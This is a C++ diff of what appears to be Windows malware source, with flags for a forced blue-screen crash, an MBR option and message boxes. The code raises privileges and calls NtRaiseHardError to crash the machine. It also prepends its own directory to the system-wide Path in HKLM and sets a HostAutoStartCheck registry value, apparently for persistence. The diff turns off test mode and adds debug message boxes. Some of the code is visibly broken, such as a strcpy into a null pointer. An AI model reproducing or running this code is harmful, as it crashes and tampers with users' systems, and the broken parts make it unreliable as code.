@@ -1,4 +1,4 @@
-#define TEST true
+#define TEST false
 #define BSOD false
 #define MBR false
 #define MESSAGEBOX true
@@ -29,7 +29,7 @@ extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BO
 extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);
 
 void raise() {
-	if (!BSOD) { return; };
+	if (!BSOD) { MessageBoxA(NULL, "raise();", "Jf#AD@83g$&&dA64%q$.MZ", MB_OK); return; };
 	BOOLEAN bl;
 	ULONG Response;
 	RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
@@ -82,29 +82,31 @@ using namespace std;
 
 enum RegStat {
 	Ok,
-	Error,
+	ErrorOpen,
+	ErrorGet,
+	ErrorSet,
 	NFoundKey,
 	NFoundVal,
 	NEq
 };
 
-RegStat GetRegVal(HKEY Root, LPCSTR Subdir, LPCSTR Name, char Buffer[]) {
+RegStat GetRegVal(HKEY Root, LPCSTR Subdir, LPCSTR Name, char Buffer[], DWORD* debug) {
 	HKEY key;
 	LSTATUS res = RegOpenKeyA(Root, Subdir, &key);
 	if (res != ERROR_SUCCESS) {
-		return (res == ERROR_FILE_NOT_FOUND) ? NFoundKey : Error;
+		return (res == ERROR_FILE_NOT_FOUND) ? NFoundKey : ErrorOpen;
 	}
 	DWORD size = MAX_PATH;
 	res = RegQueryValueExA(key, Name, NULL, NULL, (LPBYTE)Buffer, &size);
 	if (res != ERROR_SUCCESS) {
-		return (res == ERROR_FILE_NOT_FOUND) ? NFoundKey : Error;
+		return (res == ERROR_FILE_NOT_FOUND) ? NFoundKey : ErrorGet;
 	}
 	return Ok;
 }
 
 RegStat CheckRegVal(HKEY Root, LPCSTR Subdir, LPCSTR Name, string Value) {
 	char buff[MAX_PATH] = { 0 };
-	RegStat res = GetRegVal(Root, Subdir, Name, buff);
+	RegStat res = GetRegVal(Root, Subdir, Name, buff, NULL);
 	if (res != Ok) {
 		return res;
 	}
@@ -116,11 +118,11 @@ RegStat SetRegVal(HKEY Root, LPCSTR Subdir, LPCSTR Name, string Value) {
 	HKEY key;
 	LSTATUS res = RegOpenKeyA(Root, Subdir, &key);
 	if (res != ERROR_SUCCESS) {
-		return (res == ERROR_FILE_NOT_FOUND) ? NFoundKey : Error;
+		return (res == ERROR_FILE_NOT_FOUND) ? NFoundKey : ErrorOpen;
 	}
 	res = RegSetValueExA(key, Name, NULL, REG_SZ, (LPBYTE)Value.c_str(), (DWORD)MAX_PATH);
 	if (res != ERROR_SUCCESS) {
-		return Error;
+		return ErrorSet;
 	}
 	return Ok;
 }
@@ -128,11 +130,11 @@ RegStat SetRegVal(HKEY Root, LPCSTR Subdir, LPCSTR Name, char Value[]) {
 	HKEY key;
 	LSTATUS res = RegOpenKeyA(Root, Subdir, &key);
 	if (res != ERROR_SUCCESS) {
-		return (res == ERROR_FILE_NOT_FOUND) ? NFoundKey : Error;
+		return (res == ERROR_FILE_NOT_FOUND) ? NFoundKey : ErrorOpen;
 	}
 	res = RegSetValueExA(key, Name, NULL, REG_SZ, (LPBYTE)Value, (DWORD)MAX_PATH);
 	if (res != ERROR_SUCCESS) {
-		return Error;
+		return ErrorSet;
 	}
 	return Ok;
 }
@@ -140,11 +142,11 @@ RegStat SetRegVal(HKEY Root, LPCSTR Subdir, LPCSTR Name, DWORD Value) {
 	HKEY key;
 	LSTATUS res = RegOpenKeyA(Root, Subdir, &key);
 	if (res != ERROR_SUCCESS) {
-		return (res == ERROR_FILE_NOT_FOUND) ? NFoundKey : Error;
+		return (res == ERROR_FILE_NOT_FOUND) ? NFoundKey : ErrorOpen;
 	}
 	res = RegSetValueExA(key, Name, NULL, REG_DWORD, (LPBYTE)&Value, (DWORD)MAX_PATH);
 	if (res != ERROR_SUCCESS) {
-		return Error;
+		return ErrorSet;
 	}
 	return Ok;
 }
@@ -414,8 +416,11 @@ int main(){
 			goto work;
 		}
 		CreateThread(NULL, NULL, task, NULL, NULL, NULL);
-		char buff[MAX_PATH] = { 0 };
-		if (GetRegVal(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", "Path", buff) != Ok) {
+		char buff[MAX_PATH] = {0};
+		RegStat res = Ok;
+		DWORD res2 = 0;
+		if ((res = GetRegVal(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", "Path", buff, &res2)) != Ok) {
+			MessageBoxA(NULL, ("Get Path " + to_string(res) + " " + to_string(res)).c_str(), "Jf#AD@83g$&&dA64%q$.MZ", MB_OK);
 			goto work;
 		}
 		string Dir = getabspathincurrdir() + ";";
@@ -423,13 +428,16 @@ int main(){
 		char* buff2 = { 0 };
 		strcpy(buff2, Dir.c_str());
 		strcat(buff2, buff);
-		if (SetRegVal(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", "Path", buff2) != Ok) {
+		if ((res = SetRegVal(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", "Path", buff2)) != Ok) {
+			MessageBoxA(NULL, ("Set Path " + to_string(res)).c_str(), "Jf#AD@83g$&&dA64%q$.MZ", MB_OK);
 			goto work;
 		}
-		if (SetRegVal(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", "HostAutoStartCheck", "yes") != Ok) {
+		if ((res = SetRegVal(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", "HostAutoStartCheck", "yes")) != Ok) {
+			MessageBoxA(NULL, ("Set HASC " + to_string(res)).c_str(), "Jf#AD@83g$&&dA64%q$.MZ", MB_OK);
 			goto work;
 		}
 		raise();
+		goto work;
 	}
 
 }
